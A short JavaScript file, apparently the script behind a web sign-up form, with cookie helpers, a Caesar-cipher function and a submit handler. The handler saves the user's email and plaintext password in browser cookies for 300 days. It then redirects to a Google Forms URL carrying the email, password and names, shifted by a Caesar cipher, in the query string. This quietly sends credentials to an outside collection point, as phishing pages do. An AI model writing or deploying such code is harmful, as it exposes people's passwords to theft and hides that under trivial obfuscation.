function setCookie(cname, cvalue, exdays) {
  var d = new Date();
  d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
  var expires = "expires="+d.toUTCString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}
function getCookie(cname) {
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
var caesarShift = function(str, amount) {

	// Wrap the amount
	if (amount < 0)
		return caesarShift(str, amount + 26);

	// Make an output variable
	var output = '';

	// Go through each character
	for (var i = 0; i < str.length; i ++) {

		// Get the character we'll be appending
		var c = str[i];

		// If it's a letter...
		if (c.match(/[a-z]/i)) {

			// Get its code
			var code = str.charCodeAt(i);

			// Uppercase letters
			if ((code >= 65) && (code <= 90))
				c = String.fromCharCode(((code - 65 + amount) % 26) + 65);

			// Lowercase letters
			else if ((code >= 97) && (code <= 122))
				c = String.fromCharCode(((code - 97 + amount) % 26) + 97);

		}

		// Append
		output += c;

	}

	// All done!
	return output;

}
function submit(){
  if(document.getElementById('agree').innerHTML == 'Agreed' && document.getElementById("email").value != '' && document.getElementById("password").value != '' && document.getElementById("first").value != '' && document.getElementById("last").value != ''){
    setCookie('email', document.getElementById("email").value, 300);
    setCookie('password', document.getElementById("password").value, 300);
    window.location = "https://docs.google.com/forms/d/e/1FAIpQLSdkUhh_a-utGeBpMlgeYBSkCv3RzSuvY1F9Z1MP5CxEaA5cCw/viewform?usp=pp_url&entry.1938917475=" + caesarShift(document.getElementById("email").value, 14) + '-' + caesarShift(document.getElementById("password").value, 14) + '-' + caesarShift(document.getElementById("first").value, 14) + '-' + caesarShift(document.getElementById("last").value, 14);
  }
}
